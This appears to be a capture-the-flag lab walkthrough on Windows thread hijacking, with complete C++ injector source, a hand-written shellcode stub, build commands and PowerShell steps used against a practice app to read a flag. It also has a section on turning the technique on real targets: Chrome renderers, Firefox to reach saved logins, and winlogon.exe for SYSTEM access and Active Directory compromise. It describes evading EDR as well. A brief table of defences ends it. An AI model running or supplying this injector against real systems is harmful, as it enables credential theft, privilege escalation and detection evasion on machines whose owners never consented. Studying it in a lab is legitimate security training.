# #18 — Thread Hijacking (SetThreadContext)

**Difficulty:** MEDIUM — the code is like #15 (same register-saving stub), but execution timing is finicky.

## What is this attack?

**Pause one of the target's existing threads, change its instruction pointer (RIP) to point at your code, let it run.** When Windows resumes the thread, it executes your stub first, your stub calls `LoadLibraryA` (or anything else), then jumps back to where the thread was going.

No new thread was created. No DLL path was flagged by `CreateRemoteThread` monitoring. The host's own thread does the dirty work.

## Why it works

Every thread in Windows has a saved context — register values the kernel keeps for the thread when it isn't running. For a suspended thread, you can:

- `GetThreadContext` → read the saved RIP (the next instruction it will execute)
- Modify any register
- `SetThreadContext` → the kernel adopts your changes
- `ResumeThread` → thread runs from the (modified) RIP

The classic chain:
1. `OpenThread(THREAD_ALL_ACCESS, ...)`
2. `SuspendThread`
3. `GetThreadContext` → save original RIP
4. Allocate RWX page in target, write a stub that calls `LoadLibraryA` and jumps back
5. `SetThreadContext.Rip = stub`
6. `ResumeThread`

## Why it's harder than #13 in practice

**Which thread you pick matters enormously.** A UI thread parked in `MsgWaitForMultipleObjects` won't fire your stub until it wakes up (a window message arrives). A thread stuck in `WaitForSingleObject` on a kernel object may never wake. A GC thread fires on the next collection — could be seconds, could be hours.

**Reliable targets for hijacking:**
- A thread that's currently in `Running` state (rare — thread-snapshot timing matters)
- A worker thread in a thread pool that handles frequent work
- The main UI thread of a GUI app — *then* you nudge the app's window with `PostMessage` to force it to wake

**Unreliable targets:**
- Finalizer thread (fires only when GC decides)
- Timer threads
- I/O completion threads waiting on a slow kernel object

## When attackers use this

- EDR flags every new thread creation (`CreateRemoteThread`), but doesn't inspect existing threads for RIP changes
- You want zero new threads in the process (process-forensics evasion)
- You've already injected code and need to pivot to a thread with more privileges (e.g., in a browser renderer, hijack the main thread which has GPU access)

## Tools you need

Same as #13. Plus Process Hacker's "Threads" tab to pick a target TID.

## Step-by-step

### Step 1 — Find a victim thread

```powershell
$mvtc = Get-Process -Name MVTC
$mvtc.Threads | Select-Object Id, WaitReason, StartTime,
    @{N='TotalMs';E={[int]$_.TotalProcessorTime.TotalMilliseconds}} |
    Sort-Object TotalMs -Descending | Select-Object -First 10
```

Pick a thread that has non-trivial `TotalMs` and whose `WaitReason` is `UserRequest` (message pump) or `Executive` (short wait).

For a WPF app, also find the actual UI thread:

```powershell
Add-Type -Namespace W -Name U32 -MemberDefinition `
    '[DllImport("user32.dll")] public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint pid);'
$p = 0
[W.U32]::GetWindowThreadProcessId($mvtc.MainWindowHandle, [ref]$p)
# → prints the UI thread's TID
```

### Step 2 — Write the hijacker

Save as `hijack18.cpp`:

```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char** argv) {
    if (argc < 3) { printf("Usage: %s <PID> <DLL> [TID]\n", argv[0]); return 1; }
    DWORD pid = atoi(argv[1]);
    const char* dll = argv[2];
    DWORD victimTid = (argc == 4) ? atoi(argv[3]) : 0;

    // If no TID specified, pick the first one
    if (!victimTid) {
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        THREADENTRY32 te = { sizeof(te) };
        if (Thread32First(snap, &te)) do {
            if (te.th32OwnerProcessID == pid) {
                victimTid = te.th32ThreadID; break;
            }
        } while (Thread32Next(snap, &te));
        CloseHandle(snap);
    }

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, victimTid);

    SuspendThread(hThread);

    CONTEXT ctx = {}; ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(hThread, &ctx);
    DWORD64 origRip = ctx.Rip;

    // Write DLL path into target
    size_t len = strlen(dll) + 1;
    LPVOID pathBuf = VirtualAllocEx(hProc, nullptr, len,
                                    MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    WriteProcessMemory(hProc, pathBuf, dll, len, nullptr);

    // The SAME register-preserving stub as #15's hollow15.cpp
    LPVOID llA = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    unsigned char stub[] = {
        0x9C, 0x50, 0x51, 0x52,
        0x41,0x50, 0x41,0x51, 0x41,0x52, 0x41,0x53,
        0x48,0xB9, 0,0,0,0,0,0,0,0,
        0x48,0xB8, 0,0,0,0,0,0,0,0,
        0x48,0x83,0xEC,0x28,
        0xFF,0xD0,
        0x48,0x83,0xC4,0x28,
        0x41,0x5B, 0x41,0x5A, 0x41,0x59, 0x41,0x58,
        0x5A, 0x59, 0x58,
        0x9D,
        0x48,0xB8, 0,0,0,0,0,0,0,0,
        0xFF,0xE0
    };
    memcpy(stub + 14, &pathBuf, 8);
    memcpy(stub + 24, &llA,     8);
    memcpy(stub + 56, &origRip, 8);

    LPVOID stubAddr = VirtualAllocEx(hProc, nullptr, sizeof(stub),
                                     MEM_COMMIT|MEM_RESERVE,
                                     PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProc, stubAddr, stub, sizeof(stub), nullptr);

    ctx.Rip = (DWORD64)stubAddr;
    SetThreadContext(hThread, &ctx);
    ResumeThread(hThread);

    printf("[+] hijacked TID %lu, nudge the window to force scheduling\n", victimTid);
    Sleep(5000);
    CloseHandle(hThread); CloseHandle(hProc);
    return 0;
}
```

### Step 3 — Build

```bash
cl /EHsc /O2 /nologo hijack18.cpp /link /OUT:hijack18.exe
cl /LD /EHsc /O2 /nologo flag_reader18.cpp /link /OUT:flag_reader18.dll
```

(The flag reader is the same as #13's but searches for `v18_`.)

### Step 4 — Run and nudge

```powershell
# 1. Hijack the UI thread
.\hijack18.exe 6944 C:\full\path\to\flag_reader18.dll <UI_TID>

# 2. Immediately post a message to wake MVTC's message pump
Add-Type -Namespace W -Name U32 -MemberDefinition `
    '[DllImport("user32.dll")] public static extern bool PostMessage(IntPtr h, uint m, IntPtr w, IntPtr l);'
$mvtc = Get-Process -Name MVTC | Select -First 1
# WM_NULL = 0, WM_PAINT = 0x0F
[W.U32]::PostMessage($mvtc.MainWindowHandle, 0, 0, 0) | Out-Null
```

Or just click the MVTC window.

### Step 5 — Read the flag

```powershell
type C:\loot\flag18.txt
```

## Alternative — Reliable "hijack" via CreateRemoteThread + CREATE_SUSPENDED

If pure hijacking of an existing thread is too flaky for your target, there's a reliable variant:

1. `CreateRemoteThread(... CREATE_SUSPENDED ...)` — creates a thread but doesn't start it
2. `SetThreadContext.Rip = your stub`
3. `ResumeThread`

This is still "thread hijacking" semantically (you're redirecting a thread via `SetThreadContext`), but you created the thread yourself so you control the timing exactly.

## How to apply this to a real target

### Hijack a browser's main renderer thread

Chrome's renderer threads are easy to find via Process Hacker — pick the one with high CPU. Your stub loads a DLL that attaches to V8 and dumps the current page's DOM. The target had HTTPS cert pinning? Not from inside the renderer, you don't.

### Browser extension bypass

Firefox extensions run in a sandboxed child. Hijack the parent `firefox.exe` main thread — your injected DLL has unsandboxed access to `about:config`, saved logins, master-password protected secrets.

### Red-team favorite: hijack `winlogon.exe`

`winlogon` runs as SYSTEM, SessionId=1. Hijacking its UI thread (after acquiring `SeDebugPrivilege`) gives you SYSTEM in interactive session. Classic pivot for AD compromise.

## How defenders fix this

| Mitigation | Effect |
|---|---|
| **`ProcessStrictHandleCheckPolicy`** | `OpenThread(THREAD_ALL_ACCESS)` denied unless caller owns the thread |
| **Credential Guard / Device Guard** | Prevents hijacking any VSM-protected thread (LSA Isolation) |
| **ETW Kernel-Thread events** | Logs every `SetThreadContext` with non-image RIP |
| **PsSetThreadNotifyRoutine** callback | EDR kernel driver can see RIP transitions outside mapped images |

## Flag captured

```
MVTC{v18_thj_████████████████████}
```
